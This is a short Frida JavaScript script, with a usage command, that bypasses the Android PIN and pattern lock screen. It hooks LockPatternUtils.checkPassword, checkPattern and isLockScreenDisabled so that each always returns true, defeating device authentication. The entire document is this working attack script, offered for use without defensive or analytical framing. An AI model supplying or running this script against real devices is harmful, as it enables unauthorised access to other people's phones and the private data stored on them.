// Bypass PIN/Pattern lock screen
// Usage: frida -U -l pin-bypass.js -f com.android.settings --no-pause

Java.perform(function() {
    var LockPatternUtils = Java.use('com.android.internal.widget.LockPatternUtils');

    LockPatternUtils.checkPassword.implementation = function(password) {
        console.log('[+] PIN bypass: returning true');
        return true;
    };

    LockPatternUtils.checkPattern.implementation = function(pattern) {
        console.log('[+] Pattern bypass: returning true');
        return true;
    };

    LockPatternUtils.isLockScreenDisabled.implementation = function() {
        return true;
    };

    console.log('[+] Lock screen bypass active!');
});
